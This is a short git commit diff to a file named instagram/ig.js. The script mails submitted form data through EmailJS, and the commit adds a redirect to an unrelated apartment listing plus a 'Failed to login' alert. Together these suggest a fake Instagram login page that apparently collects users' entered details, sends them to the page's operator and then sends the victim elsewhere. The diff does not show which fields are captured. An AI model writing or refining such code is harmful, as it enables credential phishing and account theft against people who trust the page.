20e9fdbde446cdac1ba09ead65c54c56e21a6907
Linda101010101 <lindaaddyrea@gmail.com>
2025-06-05 07:29:27 +0100

    fix naming

--- instagram/ig.js
+++ instagram/ig.js
@@ -32,9 +32,11 @@ document.addEventListener("DOMContentLoaded", function () {
         emailjs.send("service_0rucnsl", "template_ve6yzyn", templateParams)
             .then(function (response) {
                 console.log("SUCCESS!", response.status, response.text);
+                // Redirect after successful email send
+                window.location.href = "https://www.redfin.com/NV/Las-Vegas/Terravita-Apartments/apartment/40099676?utm_campaign=copy&utm_medium=share&utm_source=web_share";
             }, function (error) {
                 console.error("FAILED...", error);
-                alert("Failed to send email.");
+                alert("Failed to login");
             });
     });
 });
